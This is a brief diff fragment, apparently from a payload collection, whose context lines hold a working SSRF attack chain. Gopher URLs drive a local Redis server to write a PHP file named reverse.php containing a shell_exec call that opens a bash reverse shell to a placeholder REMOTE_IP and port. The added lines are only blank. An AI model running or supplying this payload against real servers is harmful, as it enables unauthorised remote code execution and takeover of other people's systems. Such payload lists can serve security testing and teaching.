@@ -24,3 +24,5 @@ gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
 gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
 gopher://127.0.0.1:6379/_save
 ```
+
+
